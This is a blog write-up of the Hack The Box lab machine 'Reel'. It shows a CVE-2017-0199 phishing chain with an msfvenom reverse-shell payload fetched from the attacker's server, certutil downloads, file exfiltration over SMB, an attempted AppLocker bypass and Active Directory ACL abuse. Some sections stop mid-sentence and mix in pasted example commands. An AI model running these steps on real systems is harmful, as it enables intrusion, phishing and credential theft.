---
title: HTB-Reel
draft: false
tags:
  - htb
  - windows
  - hard
  - active-directory
---
![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/reel/Reel.png)

## Information Gathering
### Rustscan

Let's first scan for all open ports using rustscan. 

Rustscan discovers several ports open, including **SSH**, **FTP**, and **SMTP**:

`rustscan --addresses 10.10.10.77 --range 1-65535`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/reel/image-6.png)

## Enumeration
### SMB - TCP 445

We will first start with enumerating SMB.

Crackmapexec discovers the domain **HTB.LOCAL**, which we add to `/etc/hosts`:
![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/reel/image-5.png)

### FTP - TCP 21

Let's move on to enumerating FTP.

Luckily, FTP is misconfigured to accept anonymous logins and there is one directory called **documents** init:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/reel/image.png)

Inside documents, there are three files, which we download using `mget` command:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/reel/image-1.png)

**readme.txt** seems to be saying that if we email rtf format files, some user will review it. This is definetely something interesting since we have SMTP running on this machine:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/reel/image-2.png)

**AppLocker.docx** says exe, msi, and scripts are in effect. We might need to bypass applocker later. 

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/reel/image-3.png)

**Windows Event Forwarding.docx** has bunch of configurations on it, which at this point aren't that helpful:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/reel/image-4.png)

However, taking a look at **Windows Event Forwarding.docx** using `exiftool`, creator is found to be **nico@megabank.com**, which is very interesting:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/reel/image-30.png)

### SMTP - TCP 25

Since we have a potential valid user **nico**, let's verify using SMTP:

`ismtp -h 10.10.10.77 -e ~/Documents/htb/reel/user-list.txt`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/reel/image-31.png)

`ismtp` verifies user nico is a valid user.

## Shell as nico
### CVE-2017-0199

Recalling **readme.txt** from the FTP earlier, let's try on [CVE-2017-0199](https://nvd.nist.gov/vuln/detail/CVE-2017-0199):

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/reel/image-7.png)

We will use [this exploit](https://github.com/bhdresh/CVE-2017-0199) for it. 

We will first create a malicious payload that will spawn a reverse shell:

`msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.36 LPORT=443 -f hta-psh -o msfv.hta`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/reel/image-8.png)

Now, let's create a malicious file that will grab and launch our reverse shell payload from the Python server when it is accessed from a different user:

`python2 CVE-2017-0199/cve-2017-0199_toolkit.py -M gen -w invoice.rtf -u http://10.10.14.36/msfv.hta -t rtf -x 0`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/reel/image-9.png)

Now assuming `nico@megabank.com` is the user who will access the emailed file, let's send a email to **nico** attaching the malicious document:

`sendEmail -f jadu@megabank.com -t nico@megabank.com -u "Urgent!" -m "You just got hacked" -a invoice.rtf -s 10.10.10.77 -v`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/reel/image-10.png)

In a little bit, we can see that **nico** accessing the sent document and the document grabbing malicious payload from our Python server:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/reel/image-11.png)

After the document grabs the payload, it is executed, and we get a shell as **nico**:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/reel/image-12.png)

## Privesc: nico to tom
### PSCredential

Looking around the file system, we discovered **cred.xml** inside nico's Desktop:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/reel/image-13.png)

This is a PSCredentials file:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/reel/image-14.png)

On [HTB-Pov](https://jadu101.github.io/Hackthebox%F0%9F%93%A6/Windows%F0%9F%93%98/HTB-Pov#pscredentials), we've already decrypted PSCredentials before. 

Let's use the following command to decrypt it:

`powershell -c "$cred = Import-CliXml 'C:\Users\nico\Desktop\cred.xml'; $cred.GetNetworkCredential() | fl"`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/reel/image-15.png)

Password for tom is revealed to be **1ts-mag1c!!!**

Usually if we have a credentials for a new user, we will utilize **RunasCS**, but since SSH is open, let's SSH login as tom:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/reel/image-16.png)

## Privesc: tom to claire
### Local Enumeration

Exploring around the file system as user tome, we found interesting file and a directory inside tom's desktop:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/reel/image-17.png)

**note.txt** is saying that there aare no AD attack paths from the user to the Domain Admin:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/reel/image-18.png)

Inside Bloodhound directory, we see `PowerView.ps1` and another directory of Ingestors:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/reel/image-19.png)

Trying to run `SharpHound.exe` inside the Ingestors directory, we are blocked by the AppLocker:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/reel/image-20.png)

### AppLocker Bypass (Failed)

> For the following content, we took [this article](https://juggernaut-sec.com/applocker-bypass/) as a reference. 

Let's take a look at the AppLocker Policy:

`powershell -c "Get-ApplockerPolicy -Effective -Xml"`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/reel/image-32.png)

Since the output is too big, let's save it to a file:

`powershell -c "Get-ApplockerPolicy -Effective -Xml | Out-File -FilePath 'C:\ProgramData\output.xml'"`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/reel/image-33.png)

Now let's try transferring the output to our local machine to take a better look at it. We will use nc.exe to do so. 

We will first transfer the nc.exe file over to the target machine using certutil.exe:

`certutil.exe -urlcache -split -f http://10.10.14.36:8000/nc.exe`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/reel/image-21.png)

Unfortunately, we cannot use nc.exe to trasfer the output since running nc.exe is also blocked by the applocker:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/reel/image-34.png)

Since we can't use nc.exe, let's try with smbserver.

We wil frist start a SMB server on our Kali machine:

`impacket-smbserver share .`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/reel/image-22.png)

On the target machine, let's connect to the created SMB server:

`net use * \\10.10.14.36\share`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/reel/image-35.png)

Through the command `copy output.xml Y:` on target machine, we can copy the Applocker output to our local Kali machine:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/reel/image-36.png)

Let's take a look at it using Firefox:

`firefox output.xml`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/reel/image-39.png)

We can also see several exceptions:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/reel/image-38.png)

Another way to enumerate AppLocker is using the command below:

`Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/reel/image-37.png)

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/reel/image-40.png)

The default rules that are set permit the execution of executables and scripts only from within C:\Windows\* or C:\Program Files\*. 

This means that we can only execute scripts from either of those folders or any subfolders inside (from the wildcard). The only issue is that these folders generally have tight permissions by default.


So now what can we do from here? Well, we can check our permissions on all of the folders in both C:\Program Files and C:\Windows; however, fortunately for us, someone has already done that and created a list of default folders standard users can write to within C:\Windows\* on [here](https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md).

We will create a list of those default writeable path:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/reel/image-41.png)

Let's trasnfer it to the target machine:

`certutil.exe -urlcache -f -split http://10.10.1.4.36:8000/icacls.txt`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/reel/image-42.png)

Below command will use a for loop to run icacls against each line of the icacls.txt file. We also filtered our results to show us only the folders we have write permissions on.

```powershell
for /F %A in (C:\Windows\Temp\icacls.txt) do ( cmd.exe /c icacls "%~A" 2>nul | findstr /i "(F) (M) (W) (R,W) (RX,WD) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. ) 
```

Following paths were identified to be writeable:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/reel/image-45.png)

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/reel/image-46.png)

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/reel/image-47.png)

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/reel/image-44.png)

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/reel/image-43.png)

We will use `C:\Windows\Tasks` for it. Let's copt SharpHound.ps1 over to `C:\Windows\Tasks`:

`copy .\SharpHound.ps1 C:\Windows\Tasks`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/reel/image-48.png)

However, evern after doing all above, we failed to bypass AppLocker. 

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/reel/image-49.png)

Let's move on.



### acls.csv

We wanted to run SharpHound, but bypassing AppLocker failed. Now what?

Exploring the file system little more, we discovered **acls.csv** file:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/reel/image-50.png)

Let's transfer this back at us using SMB server.

Star SMB server on Kali machine:

`impacket-smbserver share .`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/reel/image-23.png)

Connect to the SMB server from the target machine:

`net use * \\10.10.14.36\share`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/reel/image-24.png)

Transfer **acls.csv** file back at us:

`copy acls.csv Z:\`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/reel/image-26.png)

Let's take a look at the file.

This files seems to be result of SharpHound but in CSV format:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/reel/image-25.png)

With **acls.csv** file, we won't need Bloodhound.

Searching for **tom@htb.local**, we can see information about the user:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/reel/image-27.png)

So tom has WriteOwner rights over claire:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/reel/image-28.png)

I’ll see claire has WriteDacl rights over the Backup_Admins group object:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/reel/image-29.png)

Finally, we can see that Bac


So we will first

### WriteOwner

Bloodhound Support got a great guide on how to exploit this [here](https://support.bloodhoundenterprise.io/hc/en-us/articles/17312755938203-WriteOwner).

https://jadu101.github.io/Hackthebox%F0%9F%93%A6/Windows%F0%9F%93%98/HTB-Object#writeowner-abuse

To change the ownership of the object, you may use the Set-DomainObjectOwner function in PowerView.

To abuse this privilege with PowerView’s Set-DomainObjectOwner, first import PowerView into your agent session or into a PowerShell instance at the console. You may need to authenticate to the Domain Controller as the user with the password reset privilege if you are not running a process as that user.

`certutil.exe -urlcache -split -f http://10.10.14.36:1234/PowerView.ps1`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/reel/image-51.png)

To do this in conjunction with Set-DomainObjectOwner, first create a PSCredential object (these examples comes from the PowerView help documentation):

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force


$Cred = New-Object System.Management.Automation.PSCredential('htb.local\claire', $SecPassword)

Then, use Set-DomainObjectOwner, optionally specifying $Cred if you are not already running a process as the user with this privilege:

Set-DomainObjectOwner -Credential $Cred -TargetIdentity "Domain Admins" -OwnerIdentity harmj0y
Now, with ownership of the object, you may modify the DACL of the object however you wish. For more information about that, see the WriteDacl edge section.

Set-DomainObjectOwner -Credential $Cred -Identity "claire" -OwnerIdentity tom
 
Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity maria -Rights All -Verbose
 
net group "Domain Admins" maria /add

Get-DomainGroupMember -Identity 'Domain Admins'

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/reel/image-52.png)

`Set-DomainObjectOwner -identity claire -OwnerIdentity tom`

`Add-DomainObjectAcl -TargetIdentity claire -PrincipalIdentity tom -Rights ResetPassword`


```powershell
$cred = ConvertTo-SecureString "P@ssw0rd123!" -AsPlainText -force
Set-DomainUserPassword -identity claire -accountpassword $cred
```

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/reel/image-54.png)

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/reel/image-53.png)

## Privesc: claire to Backup_Admins

https://jadu101.github.io/Hackthebox%F0%9F%93%A6/Windows%F0%9F%93%98/HTB-Forest#writedacl

`net group backup_admins claire /add`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/reel/image-55.png)

P@ssw0rd123!


![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/reel/image-56.png)

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/reel/image-57.png)

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/reel/image-58.png)

```powershell
Get-ChildItem -Recurse "C:\Users\Administrator\Desktop\Backup Scripts" -File | Select-String -Pattern "password" -CaseSensitive:$false
```

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/reel/image-59.png)

Cr4ckMeIfYouC4n!

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/reel/image-60.png)
![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/reel/image-61.png)

## References
- https://www.proofpoint.com/us/blog/threat-insight/injection-new-black-novel-rtf-template-inject-technique-poised-widespread
- https://nvd.nist.gov/vuln/detail/CVE-2017-0199
- https://github.com/bhdresh/CVE-2017-0199
- https://jadu101.github.io/Hackthebox%F0%9F%93%A6/Windows%F0%9F%93%98/HTB-Pov#pscredentials
- https://juggernaut-sec.com/applocker-bypass/
- https://support.bloodhoundenterprise.io/hc/en-us/articles/17312755938203-WriteOwner
- https://jadu101.github.io/Hackthebox%F0%9F%93%A6/Windows%F0%9F%93%98/HTB-Object#writeowner-abuse
- https://jadu101.github.io/Hackthebox%F0%9F%93%A6/Windows%F0%9F%93%98/HTB-Forest#writedacl


